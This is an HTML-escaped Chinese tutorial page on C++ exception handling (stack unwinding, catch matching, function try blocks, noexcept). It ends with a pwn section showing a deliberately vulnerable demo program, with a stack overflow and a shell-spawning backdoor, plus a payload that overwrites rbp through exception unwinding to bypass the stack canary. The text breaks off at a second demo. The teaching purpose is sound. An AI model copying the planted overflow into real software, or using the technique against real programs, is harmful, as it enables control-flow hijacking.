&lt;/a&gt;&#xD;&#xA;&lt;/h4&gt;&lt;p&gt;C&lt;ins&gt;异常会打断正常的程序执行流，此时，可能会有一些没有释放的内存、没有关闭的文件，可能会导致数据泄漏，因此，**现代 C&lt;/ins&gt; 编程强烈推荐使用 RAII（Resource Acquisition Is Initialization）**：&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;把资源放到对象里（比如 &lt;code&gt;std::vector&lt;/code&gt; 自动释放内存）&lt;/li&gt;&#xA;&lt;li&gt;这样即使发生异常，栈展开时对象会自动调用析构函数，自动清理资源&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;高级异常机制&#34;&gt;&lt;span&gt;高级异常机制&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#%e9%ab%98%e7%ba%a7%e5%bc%82%e5%b8%b8%e6%9c%ba%e5%88%b6&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h3&gt;&lt;p&gt;当一个异常被&lt;code&gt;throw&lt;/code&gt;时，接下来的语句不会再执行，而是沿着调用链(call chain)跳到相应的&lt;code&gt;catch&lt;/code&gt;中，这会导致：&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;在跳转过程中，调用栈上沿途的函数会被退出&lt;/li&gt;&#xA;&lt;li&gt;退出时，局部对象会正常调用析构函数&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h4 class=&#34;heading-element&#34; id=&#34;对象销毁&#34;&gt;&lt;span&gt;对象销毁&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#%e5%af%b9%e8%b1%a1%e9%94%80%e6%af%81&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h4&gt;&lt;p&gt;当 &lt;code&gt;throw&lt;/code&gt; 发生时，函数会提前退出，局部对象（local objects）会自动销毁&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;类对象&lt;/strong&gt;：编译器会自动调用它们的析构函数&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;构造函数中异常&lt;/strong&gt;：类本身的析构函数不会执行，但已经成功构造的成员会被析构&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;数组 / 容器异常&lt;/strong&gt;：已经构造的元素会被析构，未构造的不会&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;内置类型&lt;/strong&gt;：不需要析构，退出时只是栈帧释放。&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h4 class=&#34;heading-element&#34; id=&#34;析构函数与异常&#34;&gt;&lt;span&gt;析构函数与异常&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#%e6%9e%90%e6%9e%84%e5%87%bd%e6%95%b0%e4%b8%8e%e5%bc%82%e5%b8%b8&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h4&gt;&lt;p&gt;栈展开时，程序已经在处理中一个异常，如果此时某个析构函数又抛出了新的异常，而且没有被它自己捕获，程序就会陷入“两个异常同时存在”的状态，这时C++ 就会调用 &lt;code&gt;std::terminate()&lt;/code&gt;，程序立刻结束&lt;/p&gt;&#xA;&lt;p&gt;如：&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;struct Bad {&#xA;    ~Bad() {&#xA;        throw std::runtime_error(&amp;#34;oops in destructor&amp;#34;); // 危险！&#xA;    }&#xA;};&#xA;&#xA;int main() {&#xA;    try {&#xA;        Bad b;&#xA;        throw std::runtime_error(&amp;#34;main error&amp;#34;);&#xA;    } catch (...) {&#xA;        std::cout &amp;lt;&amp;lt; &amp;#34;Caught exception\n&amp;#34;;&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;所以，析构函数如果会抛出异常，需要用&lt;code&gt;try-catch&lt;/code&gt;把他包起来，不能让异常传播出去&lt;/p&gt;&#xA;&lt;p&gt;如&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;struct Good {&#xA;    ~Good() {&#xA;        try {&#xA;            // 某些可能抛异常的操作&#xA;            throw std::runtime_error(&amp;#34;oops in destructor&amp;#34;);&#xA;        } catch (...) {&#xA;            // 在这里处理，不能让它继续抛&#xA;            std::cerr &amp;lt;&amp;lt; &amp;#34;Exception caught in destructor\n&amp;#34;;&#xA;        }&#xA;    }&#xA;};&lt;/code&gt;&lt;/pre&gt;&lt;h4 class=&#34;heading-element&#34; id=&#34;throw&#34;&gt;&lt;span&gt;throw&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#throw&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h4&gt;&lt;p&gt;&lt;strong&gt;异常对象的构建&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;throw std::runtime_error(&amp;#34;Something bad happened&amp;#34;);&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;&#xA;&lt;li&gt;这个表达式会创建一个特殊的对象：称为&lt;strong&gt;异常对象&lt;/strong&gt;，这个异常对象由编译器管理，存在于一个特殊的内存区域，而不是当前函数栈&lt;/li&gt;&#xA;&lt;li&gt;传给&lt;code&gt;catch&lt;/code&gt;的时候，是先复制一份，再传过去&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;&lt;strong&gt;不能抛出局部对象的指针&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;p&gt;栈展开时，局部对象会被销毁&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;int* f() {&#xA;    int x = 42;&#xA;    throw &amp;amp;x; // x 会在函数退出时销毁&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;等&lt;code&gt;catch&lt;/code&gt;执行时，这个对象可能已经销毁，造成悬空指针&lt;/p&gt;&#xA;&lt;p&gt;&lt;strong&gt;抛出异常时对类型的要求&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;被throw的表达式必须是完整类型（complete type），不能抛出一个只有声明而没有定义的类型，如：&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;//只有声明而没有定义&#xA;class Incomplete; // 声明&#xA;&#xA;void foo() {&#xA;    throw Incomplete(); &#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;类类型必须有可访问的析构函数&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;类类型必须有可访问的拷贝构造函数或移动构造函数&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;当抛出数组或函数时， 数组或函数类型会自动转成指针类型&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h4 class=&#34;heading-element&#34; id=&#34;catch&#34;&gt;&lt;span&gt;catch&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#catch&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h4&gt;&lt;p&gt;&lt;strong&gt;catch的参数就行函数参数&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;code&gt;catch (类型 参数名)&lt;/code&gt; 的写法很像函数的参数声明&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;如果你不需要用到这个参数，可以省略名字：&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;catch (std::runtime_error&amp;amp;) { ... }&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;&lt;strong&gt;catch参数类型规则&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;必须是 &lt;strong&gt;完整类型&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;允许左值引用 &lt;code&gt;catch (MyEx&amp;amp;)&lt;/code&gt;、禁止右值引用 &lt;code&gt;catch (MyEx&amp;amp;&amp;amp;)&lt;/code&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;&lt;strong&gt;匹配规则&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;p&gt;当一个异常被&lt;code&gt;throw&lt;/code&gt;，程序会按顺序检查所有&lt;code&gt;catch&lt;/code&gt;，第一个能匹配的catch会被选中，不会继续往后寻找&lt;/p&gt;&#xA;&lt;p&gt;因此，&lt;strong&gt;更具体的异常类型必须放在更前面&lt;/strong&gt;，如果有继承关系，&lt;strong&gt;子类的 catch 必须写在前面&lt;/strong&gt;，基类的写在后面。&lt;/p&gt;&#xA;&lt;p&gt;&lt;strong&gt;rethrow&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;p&gt;有时候，一个 &lt;code&gt;catch&lt;/code&gt; 只能做一部分处理，但真正的处理逻辑要交给更上层的函数&lt;/p&gt;&#xA;&lt;p&gt;这时候，&lt;code&gt;catch&lt;/code&gt; 里可以用 &lt;code&gt;throw;&lt;/code&gt; 语句把当前异常重新抛出，交给上层的 &lt;code&gt;catch&lt;/code&gt; 来继续处理。&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;catch (std::exception&amp;amp; e) {&#xA;    std::cerr &amp;lt;&amp;lt; &amp;#34;Log: &amp;#34; &amp;lt;&amp;lt; e.what() &amp;lt;&amp;lt; &amp;#34;\n&amp;#34;;&#xA;    throw; &#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;The Catch-All Handler&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;code&gt;catch(...)&lt;/code&gt; 是一种特殊的 &lt;code&gt;catch&lt;/code&gt; 块，用于&lt;strong&gt;捕获任何类型的异常&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;try {&#xA;    throw 42;  &#xA;} catch (...) {&#xA;    std::cout &amp;lt;&amp;lt; &amp;#34;Caught something!&amp;#34;;  &#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;h4 class=&#34;heading-element&#34; id=&#34;try&#34;&gt;&lt;span&gt;try&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#try&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h4&gt;&lt;p&gt;&lt;strong&gt;普通try块（ordinary try block）&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;只对 &lt;code&gt;try { ... }&lt;/code&gt; 内部抛出的异常有效。&lt;/li&gt;&#xA;&lt;li&gt;会按顺序匹配，第一个符合类型的 handler 会接管。&lt;/li&gt;&#xA;&lt;li&gt;在 try 外面抛出的异常，跟这个 handler 没关系。&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;pre&gt;&lt;code&gt;void f() {&#xA;    throw 1;  // 不会被下面的 catch 捕获&#xA;    try {&#xA;        throw 2; // 会被下面的 catch(...) 捕获&#xA;    } catch (...) {&#xA;        // 处理 2&#xA;    }&#xA;    throw 3;  // 也不会被上面的捕获&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;函数try块（function try block）&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;p&gt;和普通 try 不同，它不是语句，而是 &lt;strong&gt;整个函数体&lt;/strong&gt; 被 &lt;code&gt;try&lt;/code&gt; 包裹&lt;/p&gt;&#xA;&lt;p&gt;它的作用范围比普通的广，它能捕获：&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;函数体里的异常&lt;/li&gt;&#xA;&lt;li&gt;（如果是构造函数）初始化列表里的异常&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;pre&gt;&lt;code&gt;struct X {&#xA;    int mem;&#xA;&#xA;    // 构造函数初始化列表抛出异常&#xA;    X() try : mem(f(true)) {&#xA;        // 构造函数体&#xA;    } catch (...) {&#xA;        // 能捕获 f(true) 抛出的异常&#xA;    }&#xA;&#xA;    // 构造函数体里抛出的异常&#xA;    X(int) try {&#xA;        throw 2;&#xA;    } catch (...) {&#xA;        // 捕获 2&#xA;    }&#xA;};&lt;/code&gt;&lt;/pre&gt;&lt;h4 class=&#34;heading-element&#34; id=&#34;noexcept&#34;&gt;&lt;span&gt;noexcept&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#noexcept&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h4&gt;&lt;p&gt;了解到一个函数不会抛出异常能帮助调用者简化程序，编译器更好的优化程序&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;void recoup(int) noexcept;   // 不会抛异常&#xA;void alloc(int);             // 可能抛异常&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;我们用&lt;code&gt;noexcept&lt;/code&gt;来承诺一个函数不会抛出异常，这种承诺叫做&lt;strong&gt;nonthrowing specification&lt;/strong&gt;（不抛异常说明）&lt;/p&gt;&#xA;&lt;p&gt;需要注意：&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;code&gt;noexcept&lt;/code&gt; 必须出现在所有函数声明和定义里，或者都不出现&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;void f() noexcept;     // 声明&#xA;void f() noexcept { }  // 定义&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;如果函数声明为 &lt;code&gt;noexcept&lt;/code&gt;，但运行时仍然抛出异常，程序会调用 &lt;code&gt;std::terminate&lt;/code&gt;，直接结束&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;&lt;code&gt;noexcept&lt;/code&gt;应该在以下两种情形中被使用：&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;我们确信该函数不会抛出异常&lt;/li&gt;&#xA;&lt;li&gt;我们不知道如何处理异常&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;pwn中的利用&#34;&gt;&lt;span&gt;pwn中的利用&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#pwn%e4%b8%ad%e7%9a%84%e5%88%a9%e7%94%a8&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h3&gt;&lt;h4 class=&#34;heading-element&#34; id=&#34;demo1&#34;&gt;&lt;span&gt;demo1&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#demo1&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h4&gt;&lt;blockquote&gt;&#xA;&lt;p&gt;修改rbp控制程序执行流&lt;/p&gt;&#xA;&lt;/blockquote&gt;&#xA;&lt;pre&gt;&lt;code&gt;// exception.cpp&#xA;// g&amp;#43;&amp;#43; exception.cpp -o exc -no-pie -fPIC&#xA;#include &amp;lt;stdio.h&amp;gt;&#xA;#include &amp;lt;stdlib.h&amp;gt;&#xA;#include &amp;lt;unistd.h&amp;gt;&#xA; &#xA;void backdoor()&#xA;{&#xA;    try&#xA;    {&#xA;        printf(&amp;#34;We have never called this backdoor!&amp;#34;);&#xA;    }&#xA;    catch (const char *s)&#xA;    {&#xA;        printf(&amp;#34;[!] Backdoor has catched the exception: %s\n&amp;#34;, s);&#xA;        system(&amp;#34;/bin/sh&amp;#34;);&#xA;    }&#xA;}&#xA; &#xA;class x&#xA;{&#xA;public:&#xA;    char buf[0x10];&#xA;    x(void)&#xA;    {&#xA;        // printf(&amp;#34;x:x() called!\n&amp;#34;);&#xA;    }&#xA;    ~x(void)&#xA;    {&#xA;        // printf(&amp;#34;x:~x() called!\n&amp;#34;);&#xA;    }&#xA;};&#xA; &#xA;void input()&#xA;{&#xA;    x tmp;&#xA;    printf(&amp;#34;[!] enter your input:&amp;#34;);&#xA;    fflush(stdout);&#xA;    int count = 0x100;&#xA;    size_t len = read(0, tmp.buf, count);&#xA;    if (len &amp;gt; 0x10)&#xA;    {&#xA;        throw &amp;#34;Buffer overflow.&amp;#34;;&#xA;    }&#xA;    printf(&amp;#34;[&amp;#43;] input() return.\n&amp;#34;);&#xA;}&#xA; &#xA;int main()&#xA;{&#xA;    try&#xA;    {&#xA;        input();&#xA;        printf(&amp;#34;--------------------------------------\n&amp;#34;);&#xA;        throw 1;&#xA;    }&#xA;    catch (int x)&#xA;    {&#xA;        printf(&amp;#34;[-] Int: %d\n&amp;#34;, x);&#xA;    }&#xA;    catch (const char *s)&#xA;    {&#xA;        printf(&amp;#34;[-] String: %s\n&amp;#34;, s);&#xA;    }&#xA;    printf(&amp;#34;[&amp;#43;] main() return.\n&amp;#34;);&#xA;    return 0;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;把input函数的rbp改成&lt;code&gt;puts_got - 8&lt;/code&gt;，程序就会跳到&lt;code&gt;puts_got&lt;/code&gt;中存储的地址去执行，也就是执行&lt;code&gt;puts&lt;/code&gt;函数&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;pl = b&amp;#39;a&amp;#39;*0x30 &amp;#43; p64(0x404050 -8 ) #puts_got -8&#xA;p.sendafter(b&amp;#39;input:&amp;#39;,pl)&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;这里有几个点：&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;pl覆盖了&lt;code&gt;input&lt;/code&gt;函数的&lt;code&gt;canary&lt;/code&gt;，但是由于栈展开，直接去到上层调用链找catch，不会检查&lt;code&gt;canary&lt;/code&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;input&lt;/code&gt;函数[rbp]存的是&lt;code&gt;main&lt;/code&gt;函数的&lt;code&gt;rbp&lt;/code&gt;，减去8就是main函数的返回地址，这里是去改main函数的返回地址为puts函数&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h4 class=&#34;heading-element&#34; id=&#34;demo2&#34;&gt;&lt;span&gt;demo2&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#demo2&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 